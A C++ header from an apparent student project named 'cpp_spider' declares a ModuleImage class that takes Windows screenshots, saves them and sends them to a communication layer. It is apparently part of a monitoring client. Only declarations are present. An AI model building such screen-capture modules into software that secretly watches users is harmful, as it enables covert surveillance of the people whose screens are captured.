//
// ModuleImage.hpp for cpp_spider in sources/client/modules
//
// Made by Benoit Hamon
// Login   <benoit.hamon@epitech.eu>
//
// Started on  Thu Oct 05 10:32:29 2017 Benoit Hamon
// Last update Fri Oct 06 21:33:51 2017 Benoit Hamon
//

#pragma once

#include <gdiplus.h>

#include "../IModule.hpp"
#include "../IModuleCommunication.hpp"

class ModuleImage : public IModule {
public:
    ModuleImage(IModuleCommunication *);
    ~ModuleImage();

public:
    void start() override;

public:
    static boost::shared_ptr<ModuleImage> create(IModuleCommunication *);

private:
    void takeScrenshot(std::wstring const &filename);
    void saveImage(HBITMAP &hbitmap, std::wstring const &filename);
    void ModuleImage::sendImage(std::string const *filename);

public:
    bool GetEncoderClsid(wchar_t const *format, CLSID* pClsid);

private:
    IModuleCommunication *_moduleCommunication;
};
